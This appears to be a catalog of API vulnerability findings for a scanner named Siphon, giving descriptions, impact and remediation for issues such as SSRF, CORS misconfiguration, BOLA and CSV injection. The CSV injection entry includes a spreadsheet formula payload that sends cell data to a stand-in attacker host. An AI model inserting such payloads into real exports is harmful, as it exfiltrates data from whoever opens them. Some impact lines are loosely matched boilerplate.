title: Information Disclosure: JSONP Endpoint Detected — Potential Data Leakage
remediation_brief: Remove JSONP support and replace with proper CORS configuration that specifies allowed origins explicitly. If JSONP must be maintained for legacy compatibility, ensure authenticated JSONP endpoints validate the Referer header and implement CSRF tokens. Restrict the callback parameter to an allowlist of safe function names. Consider this a critical finding on any endpoint that returns user-specific data.
description: Siphon detected an API endpoint that supports JSONP (JSON with Padding), indicated by a callback parameter that wraps the response in a JavaScript function call. JSONP bypasses Same-Origin Policy using a script tag, enabling cross-origin data access. Authenticated JSONP endpoints are particularly dangerous because an attacker-controlled page can include a script tag pointing to the JSONP endpoint, and if the victim's browser sends session cookies, the attacker receives the victim's data in the callback. JSONP is a legacy pattern that has been superseded by CORS.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Remove JSONP support and replace with proper CORS configuration that specifies allowed origins explicitly. If JSONP must be maintained for legacy compatibility, ensure authenticated JSONP endpoints validate the Referer header and implement CSRF tokens. Restrict the callback parameter to an allowlist of safe function names. Consider this a critical finding on any endpoint that returns user-specific data.

title: Broken Access Control: Possible Mass Assignment — Response Differs
owasp_api: API6:2023 Unrestricted Access to Sensitive Business Flows
remediation_brief: Implement an explicit allowlist of accepted fields for each API endpoint. Use Data Transfer Objects (DTOs) or serialization schemas that only map documented fields, ignoring all others. Never bind request body data directly to model objects without filtering. Audit all API endpoints that accept PATCH or PUT requests for mass assignment susceptibility.
description: Siphon detected that submitting additional or undocumented fields in an API request body produces a different response (e.g., different status code, different response body structure, or modified resource state) compared to the baseline request without those fields. This behavioral difference suggests the application is processing the injected fields, which is a strong indicator of a mass assignment vulnerability. Full exploitation requires manual confirmation of which fields can be manipulated.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Improper access controls may allow privilege escalation or unauthorized resource access.
_x_remediation: Implement an explicit allowlist of accepted fields for each API endpoint. Use Data Transfer Objects (DTOs) or serialization schemas that only map documented fields, ignoring all others. Never bind request body data directly to model objects without filtering. Audit all API endpoints that accept PATCH or PUT requests for mass assignment susceptibility.

title: Injection: Possible SSRF — Delayed Response
remediation_brief: Validate all URL parameters against an allowlist of permitted schemes and destination hosts before making any outbound request. Block requests to private IP ranges (RFC 1918), link-local addresses, and cloud metadata endpoints. Implement a server-side HTTP client that enforces timeouts and restricts redirects. Log all outbound HTTP requests for monitoring purposes.
description: Siphon observed a significant and consistent response delay when injecting an internal or external URL into an API parameter, suggesting the server is fetching the supplied URL before responding. This timing-based indicator is consistent with Server-Side Request Forgery (SSRF) behavior where the server makes outbound connections based on attacker-supplied URLs. SSRF can be used to probe internal network services, access cloud metadata endpoints (e.g., 169.254.169.254), or pivot to internal systems. Manual confirmation is required to determine exploitability.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Input validation failures may allow injection attacks, data manipulation, or unauthorized code execution.
_x_remediation: Validate all URL parameters against an allowlist of permitted schemes and destination hosts before making any outbound request. Block requests to private IP ranges (RFC 1918), link-local addresses, and cloud metadata endpoints. Implement a server-side HTTP client that enforces timeouts and restricts redirects. Log all outbound HTTP requests for monitoring purposes.

title: JWT: JWT Uses Symmetric Algorithm (HS256)
remediation_brief: Migrate to asymmetric signing algorithms (RS256, ES256, or PS256) where the signing key is known only to the issuer and verification uses the corresponding public key. If symmetric algorithms must be retained, use a cryptographically strong, randomly generated secret of at least 256 bits. Rotate the signing secret periodically. Store the secret in a secrets management system, not in configuration files.
description: The API issues JWTs signed with a symmetric HMAC algorithm (HS256, HS384, or HS512). Symmetric algorithms use the same secret key for signing and verification, meaning any party that can verify tokens also knows the secret and can forge arbitrary tokens. In microservice architectures where multiple services verify JWTs, each service possesses the signing secret, increasing the blast radius if any service is compromised. A weak or brute-forceable HMAC secret compounds this risk significantly.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system.
_x_remediation: Migrate to asymmetric signing algorithms (RS256, ES256, or PS256) where the signing key is known only to the issuer and verification uses the corresponding public key. If symmetric algorithms must be retained, use a cryptographically strong, randomly generated secret of at least 256 bits. Rotate the signing secret periodically. Store the secret in a secrets management system, not in configuration files.

title: Permissive Security Header: Security Misconfiguration / CORS Wildcard with Credentials
remediation_brief: Never set Access-Control-Allow-Origin to '*' in combination with Access-Control-Allow-Credentials: true. For endpoints requiring credentialed cross-origin access, maintain an explicit allowlist of trusted origins and dynamically reflect the request origin only when it matches the allowlist. Remove the wildcard and configure a specific origin allowlist.
description: The API responds with Access-Control-Allow-Origin: * and Access-Control-Allow-Credentials: true simultaneously. While modern browsers reject this combination per the CORS specification, the configuration reveals a misunderstanding of CORS security semantics. Additionally, some non-browser clients and legacy implementations may not enforce this restriction. The intended behavior (wildcard origin with credentials) would allow any origin to make authenticated cross-origin requests, effectively neutralizing same-origin protection for authenticated API calls.
impact: An attacker could leverage this to gain significant unauthorized access, escalate privileges, or exfiltrate sensitive data from affected systems. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Never set Access-Control-Allow-Origin to '*' in combination with Access-Control-Allow-Credentials: true. For endpoints requiring credentialed cross-origin access, maintain an explicit allowlist of trusted origins and dynamically reflect the request origin only when it matches the allowlist. Remove the wildcard and configure a specific origin allowlist.

title: Information Disclosure: Credentials in URL Query Parameters
remediation_brief: Transmit all credentials and sensitive tokens in HTTP request headers (Authorization, X-API-Key) or in the request body (for POST/PUT requests). Never include credentials in URL query parameters. Review all API endpoints for credential leakage via URL parameters. Rotate any credentials that have been transmitted in URLs as they should be considered compromised.
description: The API transmits sensitive credentials (API keys, tokens, passwords, or session identifiers) in URL query parameters rather than in request headers or the request body. URL query parameters are stored in browser history, web server access logs, proxy logs, and Referer headers sent to third parties. Credentials embedded in URLs are frequently exposed through log aggregation systems, CDN log exports, and browser history synchronization, creating multiple persistent exposure vectors.
impact: An attacker could leverage this to gain significant unauthorized access, escalate privileges, or exfiltrate sensitive data from affected systems. Exposed information aids attacker reconnaissance and reveals sensitive system details.
_x_remediation: Transmit all credentials and sensitive tokens in HTTP request headers (Authorization, X-API-Key) or in the request body (for POST/PUT requests). Never include credentials in URL query parameters. Review all API endpoints for credential leakage via URL parameters. Rotate any credentials that have been transmitted in URLs as they should be considered compromised.

title: Debug Endpoint Exposed: Debug / Developer Console Exposed
remediation_brief: Immediately disable all debug endpoints in production deployments. Use environment-specific configuration to ensure debug modes are only enabled in development environments. Remove all debug middleware and interactive debuggers from production builds. Implement access controls on any remaining diagnostic endpoints (e.g., Spring Boot Actuator) to restrict them to authenticated administrators on internal networks only.
description: Siphon detected an accessible debug or developer console endpoint (e.g., /debug, /console, /__debug__, /flask-debugger, Spring Boot Actuator /actuator/env, Django admin, Werkzeug interactive debugger). Debug consoles typically provide arbitrary code execution capabilities, full environment variable disclosure (including secrets), SQL query execution, and live configuration inspection. An unauthenticated debug console is a critical severity finding and provides immediate full system compromise.
impact: An attacker could leverage this to gain significant unauthorized access, escalate privileges, or exfiltrate sensitive data from affected systems. Exposed information aids attacker reconnaissance and reveals sensitive system details.
_x_remediation: Immediately disable all debug endpoints in production deployments. Use environment-specific configuration to ensure debug modes are only enabled in development environments. Remove all debug middleware and interactive debuggers from production builds. Implement access controls on any remaining diagnostic endpoints (e.g., Spring Boot Actuator) to restrict them to authenticated administrators on internal networks only.

title: Information Disclosure: Server-Timing Header Leaks Authentication Duration
remediation_brief: Remove the Server-Timing header from authentication endpoint responses. If Server-Timing is required for performance monitoring, restrict it to internal networks or authenticated requests only. Implement constant-time comparison for credential validation to eliminate timing side-channels. Ensure authentication responses for valid and invalid credentials take equivalent time by adding artificial delays where necessary.
description: The API includes a Server-Timing header in authentication responses that reveals internal timing information such as database query duration or credential validation time. By comparing response times for valid versus invalid usernames, an attacker can perform a timing-based user enumeration attack. Differences in authentication timing (e.g., a valid username with wrong password taking longer than an invalid username) can also confirm account existence without triggering lockout mechanisms.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Weak or missing authentication allows unauthorized users to access protected resources.
_x_remediation: Remove the Server-Timing header from authentication endpoint responses. If Server-Timing is required for performance monitoring, restrict it to internal networks or authenticated requests only. Implement constant-time comparison for credential validation to eliminate timing side-channels. Ensure authentication responses for valid and invalid credentials take equivalent time by adding artificial delays where necessary.

title: Information Disclosure: API Returns More Fields Than Documented
owasp_api: API3:2023 Broken Object Property Level Authorization
remediation_brief: Implement explicit response serialization/marshaling that only includes fields defined in the API specification. Use response DTOs or serialization schemas to filter the response object before returning it. Review all undocumented fields for sensitivity. Update the API specification to formally document any fields that should be exposed, or remove them from responses.
description: The API endpoint returns more fields in its response than are documented in the API specification. The extra fields may contain internal identifiers, system metadata, hidden status flags, or other data not intended for client consumption. When the undocumented fields are sensitive (e.g., password hashes, internal user IDs, role flags, tokens), this finding escalates to Excessive Data Exposure. Even non-sensitive undocumented fields represent a schema drift risk and documentation gap.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Exposed information aids attacker reconnaissance and reveals sensitive system details.
_x_remediation: Implement explicit response serialization/marshaling that only includes fields defined in the API specification. Use response DTOs or serialization schemas to filter the response object before returning it. Review all undocumented fields for sensitivity. Update the API specification to formally document any fields that should be exposed, or remove them from responses.

title: Web Misconfiguration: HTTP Method Override — DELETE via POST Accepted
remediation_brief: Disable HTTP method override support unless strictly required for legacy client compatibility. If method override must be supported, ensure that authorization controls are applied based on the effective (overridden) method, not the HTTP transport method. Restrict which methods can be overridden and log all override usage.
description: The API accepts HTTP method overrides via the X-HTTP-Method-Override or X-Method-Override header, allowing a POST request to be processed as a DELETE, PUT, or PATCH. Method override support was originally designed for environments where only GET and POST are supported. If the API applies authorization controls based on HTTP method at the routing layer, an attacker may bypass these controls by using POST with a method override header to perform DELETE or other privileged operations.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Security misconfigurations expose unnecessary attack surface or weaken defensive controls.
_x_remediation: Disable HTTP method override support unless strictly required for legacy client compatibility. If method override must be supported, ensure that authorization controls are applied based on the effective (overridden) method, not the HTTP transport method. Restrict which methods can be overridden and log all override usage.

title: Injection: CSV Injection in User Export
remediation_brief: Prefix all user-supplied cell values in CSV exports with a single quote character to prevent formula injection. Alternatively, reject or escape cells that begin with formula-triggering characters. Warn users in the API documentation that exported data should not be opened with formula execution enabled. Consider using XLSX format with explicit cell type enforcement instead of CSV.
description: The API's data export endpoint includes user-supplied values in CSV output without sanitization. Spreadsheet applications (Excel, LibreOffice Calc, Google Sheets) interpret cell values beginning with '=', '+', '-', or '@' as formulas. An attacker can inject formula payloads (e.g., =HYPERLINK("http://attacker.com/?"&A1)) that execute when an administrator or staff member opens the exported CSV, potentially exfiltrating data from the spreadsheet or executing arbitrary commands if Dynamic Data Exchange (DDE) is enabled.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Network-level vulnerabilities may allow traffic interception, lateral movement, or unauthorized service access.
_x_remediation: Prefix all user-supplied cell values in CSV exports with a single quote character to prevent formula injection. Alternatively, reject or escape cells that begin with formula-triggering characters. Warn users in the API documentation that exported data should not be opened with formula execution enabled. Consider using XLSX format with explicit cell type enforcement instead of CSV.

title: Business Logic: Business Flow — Numeric Field Accepts Negative/Zero Value
owasp_api: API6:2023 Unrestricted Access to Sensitive Business Flows
remediation_brief: Implement server-side validation that enforces minimum value constraints for all numeric fields (e.g., quantity >= 1, amount > 0). Do not rely on client-side validation alone. Review each numeric field to determine appropriate bounds and implement both minimum and maximum value checks. Specifically test for integer overflow conditions when large positive values are submitted.
description: Siphon detected that an API endpoint accepting a numeric field (e.g., quantity, amount, price, discount) processes negative or zero values without validation. Accepting negative values in financial or inventory contexts can enable attacks such as transferring negative amounts (effectively receiving funds), adding negative quantities to a cart (to subtract price), applying discounts greater than 100%, or bypassing minimum purchase requirements. This class of business logic flaw is commonly exploited in e-commerce and fintech APIs.
impact: An attacker could potentially exploit this weakness to gain partial access, disclose sensitive information, or degrade the security posture of the affected system. Input validation failures may allow injection attacks, data manipulation, or unauthorized code execution.
_x_remediation: Implement server-side validation that enforces minimum value constraints for all numeric fields (e.g., quantity >= 1, amount > 0). Do not rely on client-side validation alone. Review each numeric field to determine appropriate bounds and implement both minimum and maximum value checks. Specifically test for integer overflow conditions when large positive values are submitted.

title: Missing Security Header: Strict-Transport-Security
remediation_brief: Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains' to all HTTPS responses. Ensure the API is only served over HTTPS and redirect all HTTP requests to HTTPS before setting the HSTS header. Consider submitting the domain to the HSTS preload list at https://hstspreload.org. Never set HSTS on HTTP responses as this provides no protection and can cause access issues.
description: The API does not include a Strict-Transport-Security (HSTS) header in its responses. Without HSTS, browsers do not enforce HTTPS connections to the API and will follow HTTP redirects or accept HTTP responses. This enables SSL stripping attacks where a network-positioned attacker downgrades the connection from HTTPS to HTTP, intercepting all API traffic including authentication tokens, session cookies, and sensitive data in transit. APIs accessible over both HTTP and HTTPS without HSTS are especially vulnerable.
impact: An attacker could leverage this to gain significant unauthorized access, escalate privileges, or exfiltrate sensitive data from affected systems. Weak cryptographic implementations may allow interception, decryption, or forgery of protected communications.
_x_remediation: Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains' to all HTTPS responses. Ensure the API is only served over HTTPS and redirect all HTTP requests to HTTPS before setting the HSTS header. Consider submitting the domain to the HSTS preload list at https://hstspreload.org. Never set HSTS on HTTP responses as this provides no protection and can cause access issues.

title: Enumeration: BOLA — Object Enumeration Possible
remediation_brief: Replace sequential integer IDs with cryptographically random UUIDs (UUIDv4) or other non-enumerable identifiers. Implement object-level authorization checks on every endpoint regardless of ID type — do not rely on unguessable IDs as a substitute for authorization. Combine opaque IDs with server-side ownership validation.
description: The API uses predictable, sequential, or guessable object identifiers (e.g., integer IDs: /api/orders/1001, /api/orders/1002) in resource URLs. While a full BOLA exploit requires the server to return another user's resource without authorization checks, predictable IDs enable automated enumeration of valid resource identifiers. An attacker can iterate through ID ranges to discover valid object IDs before exploiting missing authorization checks. This finding is a prerequisite for BOLA (SI-076) exploitation.
impact: An attacker could leverage this to gain significant unauthorized access, escalate privileges, or exfiltrate sensitive data from affected systems. Improper access controls may allow privilege escalation or unauthorized resource access.
_x_remediation: Replace sequential integer IDs with cryptographically random UUIDs (UUIDv4) or other non-enumerable identifiers. Implement object-level authorization checks on every endpoint regardless of ID type — do not rely on unguessable IDs as a substitute for authorization. Combine opaque IDs with server-side ownership validation.

title: Broken Access Control: BFLA — Broken Function Level Authorization
remediation_brief: Implement server-side function-level authorization checks on every endpoint based on the authenticated user's role and permissions. Apply the principle of least privilege: default to denying access and explicitly grant access to each role per endpoint. Use a centralized authorization framework rather than per-endpoint conditional logic. Regularly test authorization controls with each defined role.
description: Siphon confirmed that an API endpoint intended for a higher-privileged role (e.g., manager, moderator) is accessible by a lower-privileged authenticated user (horizontal privilege escalation). The server does not enforce function-level authorization checks at the endpoint, relying instead on the client to present appropriate UI. An attacker can directly call the restricted endpoint using their own valid credentials to perform actions beyond their assigned role.
impact: An attacker could leverage this to gain significant unauthorized access, escalate privileges, or exfiltrate sensitive data from affected systems. Improper access controls may allow privilege escalation or unauthorized resource access.
_x_remediation: Implement server-side function-level authorization checks on every endpoint based on the authenticated user's role and permissions. Apply the principle of least privilege: default to denying access and explicitly grant access to each role per endpoint. Use a centralized authorization framework rather than per-endpoint conditional logic. Regularly test authorization controls with each defined role.

title: Information Disclosure: Excessive Data Exposure — Sensitive Fields in API Response
owasp_api: API3:2023 Broken Object Property Level Authorization
remediation_brief: Implement explicit response serialization that only returns fields the requesting client is authorized to receive. Use response DTOs, @JsonIgnore annotations, or serialization group mechanisms to exclude sensitive fields. Never return password hashes, plaintext passwords, tokens, or private key material in any API response. Conduct a data classification review of all API response schemas.
description: The API response includes sensitive fields that should not be returned to the requesting client, such as password hashes, password reset tokens, SSNs, credit card numbers, internal system identifiers, private keys, secret tokens, or overly detailed PII. The API returns a serialized object without filtering sensitive fields, relying on the client to ignore them. An attacker who can read API responses (or who intercepts them) gains access to this sensitive data directly.
impact: An attacker (or any client) receives sensitive fields the API was never intended to expose, because filtering is left to the client. This leaks PII, credentials, tokens or internal attributes directly in API responses and is frequently the root cause of large-scale data breaches via mobile/SPA backends.
_x_remediation: Implement explicit response serialization that only returns fields the requesting client is authorized to receive. Use response DTOs, @JsonIgnore annotations, or serialization group mechanisms to exclude sensitive fields. Never return password hashes, plaintext passwords, tokens, or private key material in any API response. Conduct a data classification review of all API response schemas.

title: Broken Access Control: Cross-User Data Leakage
remediation_brief: Implement ownership validation on every endpoint that accesses user-specific resources. Verify that the authenticated user ID matches the owner of the requested resource. Do not rely on the client to supply the correct user ID — derive the target user from the authenticated session, not from URL parameters or request body. Implement comprehensive integration tests for authorization across all user-scoped endpoints.
description: Siphon confirmed that an authenticated API endpoint returns data belonging to another user when a different user's resource ID is specified. The server does not validate that the authenticated user is the owner of or has permission to access the requested resource. This is a confirmed Broken Object Level Authorization (BOLA/IDOR) vulnerability allowing horizontal privilege escalation and direct cross-user data access.
impact: An attacker could leverage this to gain significant unauthorized access, escalate privileges, or exfiltrate sensitive data from affected systems. Improper access controls may allow privilege escalation or unauthorized resource access.
_x_remediation: Implement ownership validation on every endpoint that accesses user-specific resources. Verify that the authenticated user ID matches the owner of the requested resource. Do not rely on the client to supply the correct user ID — derive the target user from the authenticated session, not from URL parameters or request body. Implement comprehensive integration tests for authorization across all user-scoped endpoints.

title: Information Disclosure: Sensitive Data Exposed in API Response
owasp_api: API3:2023 Broken Object Property Level Authorization
remediation_brief: Apply data minimization: only return the minimum data the client requires to fulfill its function. Mask or truncate sensitive fields (e.g., return last four digits of a card number only). Implement field-level access control so that sensitive fields are only returned to clients with explicit permission. Conduct a data sensitivity audit of all API response schemas against regulatory requirements (PCI-DSS, HIPAA, GDPR).
description: The API response contains sensitive data including but not limited to: full payment card numbers or PAN data, government-issued ID numbers, medical or health records, private cryptographic material, authentication credentials, or other regulated/sensitive personal information. This data is returned as part of the standard API response to the client, creating unnecessary exposure. Even if HTTPS is in use, returning sensitive data to clients that do not need it violates data minimization principles and increases breach impact.
impact: An attacker could leverage this to gain significant unauthorized access, escalate privileges, or exfiltrate sensitive data from affected systems. Exposed information aids attacker reconnaissance and reveals sensitive system details.
_x_remediation: Apply data minimization: only return the minimum data the client requires to fulfill its function. Mask or truncate sensitive fields (e.g., return last four digits of a card number only). Implement field-level access control so that sensitive fields are only returned to clients with explicit permission. Conduct a data sensitivity audit of all API response schemas against regulatory requirements (PCI-DSS, HIPAA, GDPR).

title: Authentication: Sensitive Authentication Headers Exposed in Response
remediation_brief: Audit all API response headers and remove any that contain authentication credentials, tokens, or secrets. Ensure response headers are generated from server-side configuration, not by reflecting request headers. Review logging pipelines to ensure response headers containing credentials are not captured in logs. Rotate any credentials that have been exposed in response headers.
description: The API response headers expose sensitive authentication material such as internal API keys, bearer tokens, session identifiers, or HMAC signing secrets. These values may appear in custom response headers, debug headers, or be reflected back from request headers without sanitization. An attacker who can read response headers from any position in the network path (e.g., via a proxy, CDN logging, or XSS) can extract these credentials for further exploitation.
impact: An attacker could leverage this to gain significant unauthorized access, escalate privileges, or exfiltrate sensitive data from affected systems.
_x_remediation: Audit all API response headers and remove any that contain authentication credentials, tokens, or secrets. Ensure response headers are generated from server-side configuration, not by reflecting request headers. Review logging pipelines to ensure response headers containing credentials are not captured in logs. Rotate any credentials that have been exposed in response headers.

title: Authentication: Missing Rate Limiting
aliases: Missing Rate Limit on Sensitive Endpoint
remediation_brief: Implement rate limiting on all API endpoints, with stricter limits on authentication-related endpoints. Define rate limit policies based on IP address, API key, and authenticated user. Return 429 Too Many Requests with a Retry-After header when limits are exceeded. Use a rate limiting middleware or API gateway feature rather than application-level implementation. Implement exponential backoff enforcement for repeated authentication failures.
description: The API endpoint does not enforce any rate limiting on incoming requests. An attacker can send unlimited requests to this endpoint, enabling brute-force attacks against authentication endpoints, enumeration of valid resource IDs, credential stuffing attacks, scraping of all accessible data, or resource exhaustion (denial-of-service) through compute-intensive operations. The absence of rate limiting is particularly critical on authentication, password reset, OTP, and search endpoints.
impact: An attacker could leverage this to gain significant unauthorized access, escalate privileges, or exfiltrate sensitive data from affected systems. Weak or missing authentication allows unauthorized users to access protected resources.
_x_remediation: Implement rate limiting on all API endpoints, with stricter limits on authentication-related endpoints. Define rate limit policies based on IP address, API key, and authenticated user. Return 429 Too Many Requests with a Retry-After header when limits are exceeded. Use a rate limiting middleware or API gateway feature rather than application-level implementation. Implement exponential backoff enforcement for repeated authentication failures.
